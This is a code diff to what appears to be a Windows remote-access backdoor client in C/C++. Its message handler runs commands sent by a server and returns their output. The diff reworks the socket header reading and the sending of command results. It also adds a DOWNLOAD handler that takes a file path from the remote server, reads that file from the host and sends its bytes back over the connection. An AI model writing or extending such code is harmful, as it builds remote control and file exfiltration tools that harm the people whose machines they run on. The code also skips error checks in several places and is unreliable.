@@ -69,7 +69,11 @@ void messageHandler(SOCKET connectSocket) {
     int expectedSize = 0;
     char sizeBuffer[8];
     while (true) {
-        if (recv(connectSocket, sizeBuffer, 8, 0) > 0) {
+        //recv 8b: 4b opCode + 4b expectedSize
+        int recved = 0;
+        while (recved < 8)
+            recved += recv(connectSocket, sizeBuffer + recved, 8 - recved, 0);
+        if (recved == 8) {
             memcpy(&opCode, sizeBuffer, sizeof(int));
             memcpy(&expectedSize, sizeBuffer + 4, sizeof(int));
         }
@@ -121,12 +125,10 @@ void messageHandler(SOCKET connectSocket) {
                         totalResultSize += bytesRead;
                     }
                 }
-
+            // TODO: get the SEND part outside of the if block
             // SEND to server 4byte size + data
                 send(connectSocket, (char*)&totalResultSize, sizeof(int), 0);
-                if (totalResultSize > 0) {
-                    send(connectSocket, finalResult, totalResultSize, 0);
-                }
+                send(connectSocket, finalResult, totalResultSize, 0);
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
                 if (finalResult) free(finalResult);
@@ -137,14 +139,37 @@ void messageHandler(SOCKET connectSocket) {
             free(fullCmd);
             break;
         }
-        case DOWNLOAD:
+        case DOWNLOAD: {
+            char* fileName = (char*)calloc(1, expectedSize+1);
+            int recieved = 0;
+            unsigned int fileSize = 0;
+            LARGE_INTEGER largeInt;
+            //recv from Server
+            while (recieved < expectedSize) {
+                recieved += recv(connectSocket, fileName + recieved, expectedSize - recieved, 0);
+            }
+            // Get file size and read file bytes into a buffer
+            HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+            GetFileSizeEx(hFile, &largeInt);
+            fileSize = (unsigned int)largeInt.QuadPart;
+            char* fileBuffer = (char*)malloc(fileSize);
+            ReadFile(hFile, fileBuffer, fileSize, NULL, NULL);
+            //send to server 4b size + data
+            send(connectSocket, (char*)&fileSize, sizeof(int), 0);
+            send(connectSocket, fileBuffer, fileSize, 0);
+
+            CloseHandle(hFile);
+            free(fileName);
+            free(fileBuffer);
             break;
+        }
         case UPLOAD:
             break;
         case CLOSE:
             return;
         default:
             printf("opCode not sp");
+            break;
         }
     }
 }
